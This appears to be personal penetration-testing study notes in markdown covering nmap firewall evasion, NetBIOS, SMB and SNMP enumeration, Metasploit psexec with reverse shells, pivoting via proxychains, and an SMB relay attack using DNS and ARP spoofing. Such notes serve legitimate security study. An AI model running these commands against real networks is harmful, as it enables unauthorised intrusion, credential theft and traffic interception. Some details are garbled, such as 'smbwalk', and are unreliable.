# Network

## Firewall and IDS

**Detect and evasion:**
- `-sA` (scan ACK ping) can be use to detect firewall, the result show `filtered` or `unfiltered`
- `-f` fragment packet. `--mtu` (minimum transfer unit size) custom packet size (`-f --mtu 32` packet with 32 bytes of data)
- `-D` decoy `-D 10.10.21.1,10.10.21.2`
- `g` Change source port `-g 53`
- `--data-length 200`
- `-n` disable DNS resolution
- `--ttl` set time to live time

## SMB and NetBIOS Enum

Both is file sharing service but different technology
- NetBIOS is an API and set of network protocols, provide communication service between device on local network. NetBIOS include:
  - Name services (NetBIOS-NS) ~ 137
  - Datagram services (NetBIOS-DGM) ~ 138
  - Sessions service (NetBIOS-SSN) ~ 139

Tools:
- `nbtscan <target>` Scan network for NetBIOS name
- `nmblookup -A <target>`
- `nmap -sU -p 137 <target>` Check for Name Service of NetBIOS is running (it UDP)
  - `nmap -sU -sV -p 137 <target> --script nb_stat.nse -n` We can try this script to get the service name

**For Smb** 
- `nmap -p445 --script smb-protocols <target>` Check for protocols that target supported 
- `nmap -p445 --script smb-security-mode <target>` Security level that SMB config
- `nmap -p445 --script smb-enum-users.nse <target>` Enum user
- Use `hydra` to crack password
- Or we use `windows/smb/psexec` for connection, set payload to reverse_tcp
- After exploit and have meterpreter, we can `run autoroute -s <target_2_subnet>` to gain access to target 2 that only be connect via target 1
  - Or we can setup `proxychains` and module `socks` of `msf` to access the target from host machine 
  - Proxychanins usually run on port `9050`, see config in `/etc/proxychains4.conf`
  - After that we use `use auxiliary/server/socks_proxy`, `set SRVPORT 9050` `set VERSION 4a ` -> run
  - Now we can access the target 2 from host command with `proxychains nmap <target2> -sT -Pn -sV -p 445`
- shell `net view <target>` view share of target
- `net use D: \\<target>\<share>` Assign disk to share -> `dir D:`

## SNMP

Protocols Use for monitor and manage network devices, like routers, switch, printer, fax, ...
- Application protocols
- Have 3 part:
  - SNMP manager
  - SNMP agent
  - Management infomation base (MIB): Datatbase that define structure of data available through SNMP, each piece of data have unique ID call `OID`
- Port: 161 for SNMP query, 162 for SNMP trap (Infor agent send to Manager)

**Exploit**
- `nmap -sU -p 161 <target>` -> `nmap -sU -p161 --script=snmp-* <target>` collect infor from script 
- Brute for communication string `nmap -sU -p 161 --script=snmp-brute <target>`
  - `snmp-win32-users` enum user on system -> use for hydra later
  - `snmp-processes` enum process run on system
    - `snmp-win32-services` enum services run on system
  - `snmp-interface` enum network interface of system
    - `snmp-netstat` enum net stat
  - `snmp-softwares` enum software install on system
- For more info, use `smbwalk -v 1 -c public <target>`, `-v` is version, `-c` is channel that we detected with `snmp-brute`

## SMB relay

Is a type of attack where attacker intercept SMB traffic, change it and relays it to a legitimate server to gain access. Steps of attack:
- Interception
- Capture authentication
- Relay to a legitimate server
- Gain Access

How to exploit:
- Open `msfconsole` -> search `smb_relay` use reverse_tcp payload 
  - `set srvhost <host_ip>` `set lhost <host_ip>`
  - `set smbhost <target_ip>`
- Setup dns spoofing by `echo "<host_ip> *.<target_domain>" > dns` Ex: `echo "10.10.1.1 *.example.com" > dns`
  - Run `dnsspoof -i eth1 -f dns` `-i` network interface, `-f` file
- Run `arpspoof -i eth1 -t <target_1> <target_2>` and `echo 1 > /proc/sys/net/ipv4/ip_forward` for perform an ARP poisoning attack to intercept and manipulate traffic between a victim and a target system.